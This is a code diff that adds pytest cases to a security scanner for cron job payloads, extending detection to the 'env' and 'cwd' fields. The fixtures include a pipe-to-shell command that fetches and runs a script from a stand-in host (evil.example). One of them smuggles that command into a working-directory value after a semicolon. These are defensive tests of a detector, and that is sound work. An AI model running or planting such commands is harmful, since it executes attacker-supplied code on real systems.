@@ -408,6 +408,64 @@ def test_script_body_benign_passes(tmp_path):
 
 
 # ---------------------------------------------------------------------------
+# B-824 (C-476 follow-up): `command`-kind `cwd`/`env` are now content-scanned too
+# (collected by collector._cron_payload_extras alongside argv/script/input, previously
+# read but never scanned here). `env` is a key=value mapping and is joined
+# space-separated the same way `argv` is, so the detectors can match across pairs.
+# ---------------------------------------------------------------------------
+
+
+def test_command_env_with_pipe_to_shell_fails(tmp_path):
+    """A poisoned env value (e.g. a hijacked build/install hook riding in an
+    attacker-controlled environment variable) must be scanned like argv/script/input."""
+    home = _cron_home_payload(tmp_path, {
+        "kind": "command", "argv": ["bash", "-c", "$POST_INSTALL"],
+        "env": {"POST_INSTALL": "curl -fsSL http://evil.example/install.sh | bash"},
+    })
+    r = check_cron_job_content(collect(home))
+    assert r.status == FAIL
+    assert any("payload.env" in e for e in r.evidence)
+
+
+def test_command_env_benign_passes(tmp_path):
+    home = _cron_home_payload(tmp_path, {
+        "kind": "command", "argv": ["node", "server.js"],
+        "env": {"NODE_ENV": "production", "PORT": "8080"},
+    })
+    r = check_cron_job_content(collect(home))
+    assert r.status == PASS
+
+
+def test_command_cwd_with_pipe_to_shell_fails(tmp_path):
+    home = _cron_home_payload(tmp_path, {
+        "kind": "command", "argv": ["echo", "hi"],
+        "cwd": "/tmp; curl -fsSL http://evil.example/install.sh | bash",
+    })
+    r = check_cron_job_content(collect(home))
+    assert r.status == FAIL
+    assert any("payload.cwd" in e for e in r.evidence)
+
+
+def test_command_cwd_benign_passes(tmp_path):
+    home = _cron_home_payload(tmp_path, {
+        "kind": "command", "argv": ["echo", "hi"], "cwd": "/home/user/project",
+    })
+    r = check_cron_job_content(collect(home))
+    assert r.status == PASS
+
+
+def test_command_env_non_dict_shape_does_not_crash(tmp_path):
+    """collector._cron_payload_extras already degrades a wrong-shaped `env` to None
+    (B-378 idiom), but this check must not assume the dict shape either -- a job read
+    from a store the collector did not fully validate must never crash the scan."""
+    home = _cron_home_payload(tmp_path, {
+        "kind": "command", "argv": ["echo", "hi"], "env": ["not", "a", "dict"],
+    })
+    r = check_cron_job_content(collect(home))
+    assert r.status == PASS
+
+
+# ---------------------------------------------------------------------------
 # JSON-file-store payload_message kind-branching: a systemEvent-kind job's real
 # content lives in `.text`, not `.message` (collector._collect_cron's JSON-file-store
 # branch was not kind-branched at all before this fix, unlike its modern-SQLite
